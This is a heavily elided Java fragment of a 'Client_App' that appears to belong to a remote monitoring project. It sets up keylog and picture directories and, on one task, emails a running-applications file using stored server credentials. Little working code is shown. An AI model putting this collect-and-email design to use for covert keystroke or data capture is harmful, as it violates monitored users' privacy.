...
public class Client_App extends JPanel {
    ...
    private void implement_button_Clicked(ActionEvent e) {
        ...
        if (!server_email.isEmpty() && !app_Password.isEmpty()) {
            ...
            final String default_Directory = "C:\\Users\\CSM\\Desktop\\Maven-Network-1\\NETWORK-MAVEN-1\\src\\main\\java\\resources\\Pictures";
            ...
            final String default_keylog_directory = "C:\\Users\\CSM\\Desktop\\Maven-Network-1\\NETWORK-MAVEN-1\\src\\main\\java\\resources\\KeyLog\\";
            //final String default_folder = "C:\\\\Users\\Administrator\\Desktop\\New folder";
            final String clientEmail = Test_UI.getClientContent();
            final String app_list_directory =  RunningApplications.getFilePathFromUser();
            final String app_list_file = RunningApplications.getFileNameFromPath(app_list_directory);
            ...
            switch(task_num){
                ...
                case 6:
                    ...
                    SendFile.sendEmailWithAttachment(serverEmail, clientEmail, default_subject, default_body, getParentDirectory(app_list_directory), getFileName(app_list_directory), serverEmail, server_appPassword);
